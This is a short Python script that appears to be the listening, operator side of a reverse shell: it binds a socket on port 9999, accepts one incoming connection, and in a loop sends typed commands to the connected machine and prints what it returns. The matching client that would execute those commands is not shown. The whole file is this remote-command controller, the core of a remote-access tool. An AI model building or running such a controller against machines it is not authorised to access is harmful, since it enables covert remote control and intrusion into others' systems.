import socket 
import sys # running system commands 

#Create socket (allows 2 computers 2 connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("ERROR_SOCKET_CREATION: " + msg)

#Binding the socket to the port and wait for a connection from a client; the server is just listening
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5) # accepting connections; 5 bad connections that will take until the server refuses any conncetions
    except socket.error as msg:
        print("ERROR_SOCKET_BINDING: " + msg + "\n" + "Retrying...")
        socket_bind()

#Establishing the connection with the client
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP: " + address[0] + " | Port: " + str(address[1]))
    send_commands(conn)
    conn.close()
    
#Wait for a command when the connection is established

def send_commands(conn):
    while True: #constant connection
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

#The main function
def main():
    socket_create()
    socket_bind()
    socket_accept()
 
main() 